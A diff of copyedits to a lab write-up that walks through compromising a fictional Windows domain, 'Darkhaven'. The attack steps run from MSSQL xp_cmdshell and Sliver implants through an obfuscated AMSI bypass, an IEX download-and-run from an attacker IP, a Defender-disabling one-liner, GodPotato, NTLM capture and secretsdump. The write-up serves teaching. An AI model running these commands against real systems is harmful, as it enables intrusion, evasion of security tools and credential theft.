@@ -132,7 +132,7 @@ Exegol ➜ /workspace 𝘹 fping --generate --alive 10.10.10.0/24
 10.10.10.136
 ```
 
-FPING did not identify all of the boxes so I used NMAP to enumerate and identify all.
+FPING did not identify all of the boxes, so I used NMAP to enumerate and identify every host.
 
 ## NMAP
 
@@ -149,7 +149,7 @@ Exegol ➜ /workspace 𝘹 nmap -sn -PS80,443,445,3389 10.10.10.0/24 -oG - | gre
 
 > **Why TCP SYN probes beat ICMP:** `fping` relies on ICMP echoes and missed a handful of Windows hosts that drop pings. Using `nmap -sn -PS80,443,445,3389` forces TCP SYN host discovery against the ports Windows boxes almost always answer on, catching `10.10.10.132` and `10.10.10.133` that `fping` skipped.
 
-I was able to identify an additional machine using FPING `10.10.10.129`. It also is not in the network map. While this enumerates let's look at `web.ext.darkhaven.local`.
+FPING also surfaced an additional machine at `10.10.10.129` that is not shown on the network map. While the scan finishes, let's look at `web.ext.darkhaven.local`.
 
 ## NXC to generate /etc/hosts
 
@@ -362,25 +362,25 @@ Nmap done: 5 IP addresses (5 hosts up) scanned in 144.10 seconds
 
 ![Darkhaven Web Portal Landing](/assets/images/ctf/darkhaven/web-landing.png)
 
-Client Portal takes you to a login portal, which identifies `it-helpdesk@darkhaven.local`.
+The Client Portal link takes us to a login page, which surfaces the support contact `it-helpdesk@darkhaven.local`.
 
 ![Client Portal Login](/assets/images/ctf/darkhaven/web-login.png)
 
-We can Continue as Guest.
+We can choose **Continue as Guest**.
 
 ![Continue as Guest](/assets/images/ctf/darkhaven/web-guest.png)
 
-Using the Help Desk we can identify potential default passwords.
+Using the Help Desk, we can identify potential default passwords.
 
 ![Help Desk Default Passwords](/assets/images/ctf/darkhaven/web-helpdesk.png)
 
-Further prompt enumeration:
+Further prompt interaction yields:
 
 ```zsh
 To reset your network password, please visit the self-service portal at `https://sspr.darkhaven.local` or contact the Help Desk at [it-helpdesk@darkhaven.local](mailto:it-helpdesk@darkhaven.local).
 ```
 
-We identify a user smith:
+A search for the name *smith* returns:
 
 ```zsh
 Found **2** employees matching _smith_. Showing the first 2. Refine your search for more detail.  
@@ -395,7 +395,7 @@ Facilities Coordinator — Operations
 
 > **Teaching Moment — The Helpdesk Chatbot is an Oracle:** When a public portal exposes an internal support chat, it is effectively a free LDAP-lite search. We can fingerprint the username pattern (`first initial + last name`), recover employee records, learn domain names (`darkhaven.local` vs `ext.darkhaven.local`), and in this case, extract documented "default" service account credentials that IT simply never rotated.
 
-We can confirm using NXC that the `svc_sql` account works:
+We can confirm with NXC that the `sql_svc` account works:
 
 ```zsh
 Exegol ➜ /workspace 𝘹 nxc mssql ips.txt -u 'sql_svc' -p '<redacted>'
@@ -433,7 +433,7 @@ MSSQL       10.10.10.133    1433   SQL              nt authority\system
 
 > **Teaching Moment — `sa`-class Service Accounts Are Silent SYSTEM:** A SQL login marked `(admin)` by NetExec is the local `sysadmin` fixed role. On a default Windows MSSQL install the service itself runs as `NT AUTHORITY\SYSTEM` (or a highly privileged managed account), which means any command fired through `xp_cmdshell` executes with that identity. We go from "one database credential" to "remote SYSTEM on the SQL host" in a single command.
 
-Let's build up our payloads for Sliver and take AV into consideration.
+Let's build our Sliver payloads, taking AV into consideration as we go.
 
 ### Killshot — Stager
 
@@ -515,7 +515,7 @@ Exegol ➜ /workspace 𝘹 killshot generate -l 192.168.211.2 --runner
 [*] Implant saved to /root/workspace/killshot/implant.bin
 ```
 
-Base64 encode the implant so that it works with my bypass:
+Base64-encode the implant so it works with my bypass:
 
 ```zsh
 base64 -w0 implant.bin > implant.enc
@@ -552,7 +552,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
  8b149416   mtls        10.10.10.133:64850   sql        DARKHAVEN\SQL$   windows/amd64      [ALIVE]
 ```
 
-With our foothold we can capture the `root.txt` flag:
+With our foothold in place, we can capture the `root.txt` flag:
 
 ```zsh
 PS C:\users\administrator\desktop> ls
@@ -594,7 +594,7 @@ sql_svc_int:1002:sql_svc_int:1002:<redacted>:<redacted>:::::
 
 ### Stored Passwords / KeePass Recovery
 
-On the C:\ there is a folder called `stored_passwords`:
+On the root of `C:\` there is a folder called `stored_passwords`:
 
 ```zsh
 [server] sliver (OUTER_SCARF) > cd stored_passwords
@@ -650,7 +650,7 @@ Access requests: it-security@darkhaven.local
 Master Password: <redacted>
 ```
 
-My password is not working, let's validate that the file is not corrupt:
+The documented password is not working — let's validate that the file is not corrupt:
 
 ```zsh
 PS C:\stored_passwords> certutil -hashfile C:\stored_passwords\it_passwords.kdbx SHA256
@@ -667,7 +667,7 @@ Exegol ➜ /workspace/killshot 𝘹 sha256sum /workspace/killshot/it_passwords.k
 
 > **Teaching Moment — When a "Master Password" is a Puzzle, not a Key:** The file checksummed identically on both sides, so the KDBX was intact. That means the documented master password itself was a red herring. Look at the value: `<redacted>`. Tiny transpositions (leet patterns, order of the symbols, case) are a classic CTF author move — the real password is usually a near-anagram or mirror of what the README shows. Try variants until the vault opens.
 
-I was able to figure out the password, which is correct in the README but I will leave that up to you to determine.
+I was able to figure out the password — the README does contain it, but I'll leave working out the exact transformation up to you.
 
 ![KeePass Vault Unlocked](/assets/images/ctf/darkhaven/keepass-unlocked.png)
 
@@ -691,7 +691,7 @@ I was able to figure out the password, which is correct in the README but I will
 
 ![KeePass Full List](/assets/images/ctf/darkhaven/keepass-fulllist.png)
 
-Using this information I generated a user and password list.
+Using this information, I generated a user and password list.
 
 #### KeePass Credentials — Darkhaven IT
 
@@ -726,7 +726,7 @@ svc_backup : <redacted> — Veeam B&R service account
 svc_webpool: <redacted>        — Also used as LDAP bind account
 ```
 
-Password spraying identifies we have a valid user.
+Password spraying confirms that we have a valid user.
 
 ---
 
@@ -824,7 +824,7 @@ SPIDER_PLUS 10.10.10.135    445    SHARE            [*] File size min:        76
 SPIDER_PLUS 10.10.10.135    445    SHARE            [*] File size max:        20.12 KB
 ```
 
-There is a lot of interesting files in here, let's pull them all:
+There are a lot of interesting files in here — let's pull them all:
 
 ```zsh
 Exegol ➜ .nxc/modules/nxc_spider_plus 𝘹 cat 10.10.10.135.json | jq
@@ -933,9 +933,9 @@ Exegol ➜ modules/nxc_spider_plus/10.10.10.135 𝘹 grep -rn "password\|Passwor
   - <redacted> — NetOps service account
 ```
 
-Also including the default password: `<redacted>`.
+…plus the onboarding default password `<redacted>`.
 
-I then used NXC to capture our users list:
+I then used NXC to capture the user list:
 
 ```zsh
 Exegol ➜ /workspace/killshot 𝘹 nxc ldap 10.10.10.5 -u showard -p '<redacted>' --users
@@ -966,7 +966,7 @@ LDAP        10.10.10.5      389    EC2AMAZ-KK0CT8N  ahenderson                  
 <snip>
 ```
 
-In this scan we also identify that `kwarren` also authenticated:
+In this scan we also see that `kwarren` authenticated:
 
 ```zsh
 LDAP        10.10.10.5      389    EC2AMAZ-KK0CT8N  kwarren                       2026-03-06 18:05:17 0
@@ -980,7 +980,7 @@ Evil-WinRM shell v3.9
 Info: Establishing connection to remote endpoint
 ```
 
-But it seems that all users have the default password:
+…and it seems that *every* user still has the default password:
 
 ```zsh
 Exegol ➜ /workspace/killshot 𝘹 evil-winrm -u "twells" -p "<redacted>" -i "10.10.10.136"
@@ -1027,7 +1027,7 @@ Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinR
 Error: Exiting with code 1
 ```
 
-It does look like AV might be killing this:
+At first it looked like AV might have been killing the shell:
 
 ```zsh
 *Evil-WinRM* PS C:\> cd users
@@ -1037,7 +1037,7 @@ Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinR
 Error: Exiting with code 1
 ```
 
-It appears that the accounts are locked out.
+…but as the teaching moment below explains, it turns out the accounts simply lack WinRM rights, not that they are locked out.
 
 > **Teaching Moment — Authorization ≠ Authentication:** `WinRMAuthorizationError` *after* a successful banner means the credentials were accepted but the principal is not in `Remote Management Users` or `Administrators` on the target. Don't confuse this for an AV kill or a locked account — it is a group-membership problem. The fix is to either find another service that *does* allow that principal (SMB, RDP, MSSQL) or find a different account that has the WinRM right.
 
@@ -1131,13 +1131,13 @@ Mode                 LastWriteTime         Length Name
 -a----          3/7/2026   2:21 AM             37 root.txt
 ```
 
-AMSI Bypass with my payload for Sliver implant:
+AMSI bypass so my Sliver implant payload will run:
 
 ```zsh
 & ({ ${::}=[Ref]; ${+}=${::}.Assembly.GetType(([String]::Join('',([char[]](83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115))))); ${-}=${+}.GetField(([String]::Join('',([char[]](97,109,115,105,67,111,110,116,101,120,116)))),'NonPublic,Static'); ${*}=${-}.GetValue($null); [Runtime.InteropServices.Marshal]::WriteInt64(${*},8,0) })
 ```
 
-Ignore the random characters terminal puked:
+Ignore the random characters the terminal puked back at me:
 
 ```zsh
 *Evil-WinRM* PS C:\Users\Administrator\Documents> x7({ ${::}=[Ref]; ${+}=${::}.Assembly.GetType(([String]::Join('',([char[]](83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,1IEX(IWR -UseBasicParsing http://192.168.211.2:8000/stager.ps1)                                                        *Evil-WinRM* PS C:\Users\Administrator\Documents>
@@ -1145,7 +1145,7 @@ Ignore the random characters terminal puked:
 
 ![CA Sliver Session](/assets/images/ctf/darkhaven/ca-sliver-session.png)
 
-I think AV kept killing my session so I just disabled it:
+I suspect AV kept killing my session, so I just disabled it:
 
 ```zsh
 *Evil-WinRM* PS C:\> reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
@@ -1286,11 +1286,11 @@ SeChangeNotifyPrivilege       Bypass traverse checking                          
 SeIncreaseWorkingSetPrivilege Increase a process working set                    Disabled
 ```
 
-Within RDP you can just access the admin desktop:
+Within RDP, you can simply access the admin desktop:
 
 ![SHARE Admin Desktop](/assets/images/ctf/darkhaven/share-admin-desktop.png)
 
-Since we can open up the administrator's file explorer we can run PowerShell as the admin:
+Since we can open up the administrator's file explorer, we can run PowerShell as the admin:
 
 ![PowerShell as Admin via Explorer](/assets/images/ctf/darkhaven/share-powershell-admin.png)
 
@@ -1300,7 +1300,7 @@ One-Liner for future use:
 Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true; Add-MpPreference -ExclusionPath "C:\"; sc.exe stop WinDefend; reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
 ```
 
-Within Sliver we can run PowerShell as admin as well:
+Within Sliver, we can also elevate to admin PowerShell:
 
 ```zsh
 
@@ -1367,7 +1367,7 @@ SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for anot
 
 ## GodPotato — SYSTEM
 
-We can impersonate admin with GodPotato:
+We can impersonate SYSTEM with GodPotato:
 
 ```zsh
 Exegol ➜ /workspace/killshot 𝘹 killshot generate -l 192.168.211.2 --potato GodPotato -c "powershell -ep bypass -enc SQBFAFgAKABJAFcAUgAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyADEAMQAuADIAOgA4ADAAMAAwAC8AcwB0AGEAZwBlAHIALgBwAHMAMQApAA=="
@@ -1470,7 +1470,7 @@ svc_netops:1000:svc_netops:1000:<redacted>:<redacted>:::::
 
 ## Seatbelt — LogonEvents
 
-Sliver Seatbelt kept dying so I ran it with Killshot:
+The Sliver-delivered Seatbelt kept dying, so I ran it through Killshot instead:
 
 ```zsh
 Exegol ➜ /workspace/killshot 𝘹 killshot tool Seatbelt -p 'LogonEvents'
@@ -1553,7 +1553,7 @@ Listing 4624 Account Logon Events for the last 1 days.
 
 ## Inveigh — NTLMv2 Capture
 
-We can use Inveigh to capture the logon NTLMv2:
+We can use Inveigh to capture those NTLMv2 challenge/responses:
 
 ```zsh
 PS C:\> .\Inveigh.ps1
@@ -1602,7 +1602,7 @@ svc_webpool::EC2AMAZ-IKFPL26:<redacted>
 
 ## Hashcat — Crack NetNTLMv2
 
-Rockyou did not crack it but we have this wordlist from the share previously:
+RockYou did not crack it, but we grabbed an internal wordlist from the share earlier:
 
 ```zsh
 Exegol ➜ DarkhavenData/IT/Systems 𝘹 ls
@@ -1776,7 +1776,7 @@ Mode                 LastWriteTime         Length Name
 *Evil-WinRM* PS C:\Users\administrator\desktop> type root.txt
 ```
 
-We can now get an implant on this machine and disable AV:
+We can now land an implant on this machine and disable AV:
 
 ![Web Sliver Session](/assets/images/ctf/darkhaven/web-sliver-session.png)
 
@@ -1785,9 +1785,9 @@ We can now get an implant on this machine and disable AV:
 *Evil-WinRM* PS C:\Users\administrator\desktop> Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath "C:\"
 ```
 
-I was limited to that user for Sliver tools so I changed administrator's password and got an implant there, but hashdump was still access denied.
+I was limited to that user for Sliver tooling, so I changed the administrator's password and got an implant there — but `hashdump` was still access denied.
 
-There is a folder called `tools` though that looks interesting:
+There is a folder called `Tools` that looks interesting, though:
 
 ```zsh
 [server] sliver (OUTER_SCARF) > ls
@@ -1833,7 +1833,7 @@ drwxrwxrwx  plugins            <dir>      Sat Feb 28 13:35:38 +0000 2026
 
 ```
 
-Further enumeration identifies that Notepad++ is in `appdata`:
+Further enumeration shows that Notepad++ also keeps working state in `AppData`:
 
 ```zsh
 [*] C:\users\administrator\appdata\Roaming
@@ -1848,7 +1848,7 @@ drwxrwxrwx  Microsoft  <dir>  Wed Mar 11 15:28:22 +0000 2026
 drwxrwxrwx  Notepad++  <dir>  Sat Feb 28 13:37:00 +0000 2026
 ```
 
-We now have `kwarren`'s credentials identified in the `maint_config.php` file within backup:
+We find `kwarren`'s credentials inside the `maint_config.php` backup file:
 
 ```zsh
 [*] C:\users\administrator\appdata\Roaming\Notepad++\backup
@@ -2012,7 +2012,7 @@ RustHound-CE Enumeration Completed at 09:49:47 on 04/17/26! Happy Graphing!
 
 ## gMSA Dump
 
-Using NXC we can dump the `ca_svc_account`:
+Using NXC, we can dump the `ca_svc_account` password blob:
 
 ```zsh
 Exegol ➜ /workspace/killshot 𝘹 nxc ldap 10.10.10.136 -u 'kwarren' -p '<redacted>' --gmsa
@@ -2026,7 +2026,7 @@ LDAP        10.10.10.136    389    DC               Account: ca_svc_account$    
 
 ![BloodHound — ca_svc_account Enroll](/assets/images/ctf/darkhaven/bloodhound-ca-svc-enroll.png)
 
-I could not get anything to work with targeting Enroll, but further enumeration shows that we own `ca.ext.darkhaven.local`:
+I could not get anything targeting the Enroll right to work, but further enumeration shows that we already own `ca.ext.darkhaven.local`:
 
 ```
 Exegol ➜ /workspace/killshot 𝘹 nxc smb ca.ext.darkhaven.local -u 'ca_svc_account$' -H <redacted>
@@ -2034,7 +2034,7 @@ SMB         10.10.10.134    445    CA               [*] Windows 11 / Server 2025
 SMB         10.10.10.134    445    CA               [+] ext.darkhaven.local\ca_svc_account$:<redacted> (admin)
 ```
 
-We have already compromised this machine, perhaps `ichambers` was unintended? Further enumeration with the accounts I could have bypassed a few steps, but I did take a couple weeks break on this lab. So things could be foggy. However, we can enumerate PowerShell history to identify:
+We have already compromised this machine, so perhaps `ichambers` was unintended — further enumeration with the accounts I had in hand might have let me skip a few steps. I also took a couple of weeks off this lab, so some of my earlier paths may be foggy. Either way, we can enumerate PowerShell history to surface new leads:
 
 ```zsh
 Exegol ➜ /workspace/killshot 𝘹 nxc smb ips.txt -u 'ca_svc_account$' -H <redacted> -M powershell_history -o export=True
@@ -2147,7 +2147,7 @@ d-----         2/27/2026  12:23 AM                WindowsPowerShell
 
 ```
 
-After attempting to enumerate trusts I went back and identified a binary on the Administrator's Desktop: `ldap_sync.exe`:
+After attempting to enumerate trusts, I went back and spotted a binary on the Administrator's Desktop — `ldap_sync.exe`:
 
 ```zsh
 *Evil-WinRM* PS C:\Users\Administrator\desktop> ls
@@ -2167,7 +2167,7 @@ Mode                 LastWriteTime         Length Name
 
 ## Strings — ldap_sync.exe
 
-Running `strings` against the binary for a few things that we have seen common with passwords, I identify another password:
+Running `strings` against the binary and grepping for characters commonly seen in passwords surfaces another credential:
 
 ```zsh
 Exegol ➜ /workspace/killshot 𝘹 strings ldap_sync.exe | grep !
@@ -2196,7 +2196,7 @@ H/!?
 @@$!
 ```
 
-Looking into the password that was identified:
+Inspecting the context around the identified password:
 
 ```zsh
 469-L$pM
@@ -2267,7 +2267,7 @@ SMB         10.10.10.5      445    EC2AMAZ-KK0CT8N  [*] Windows 11 / Server 2025
 SMB         10.10.10.5      445    EC2AMAZ-KK0CT8N  [+] corp.darkhaven.tech\ldap_svc:<redacted> (admin)
 ```
 
-We can request another TGT and conduct a secretsdump on DC01:
+We can request another TGT and run a secretsdump against DC01:
 
 ```zsh
 [*] Saving ticket in ldap_svc.ccache
@@ -2313,7 +2313,7 @@ corp.darkhaven.tech\svc_webpool:1115:<redacted>:<redacted>:::
 corp.darkhaven.tech\abarnes:1116:<redacted>:<redacted>:::
 ```
 
-We can capture the flag with a single command to keep it simple, flag is not shown in the writeup:
+To keep it simple, we can grab the flag with a single command. The flag itself is not shown in the writeup:
 
 ```zsh
 Exegol ➜ /workspace/killshot 𝘹 nxc winrm 10.10.10.5 -u administrator -H <redacted> -x 'type C:\Users\Administrator\Desktop\root.txt'
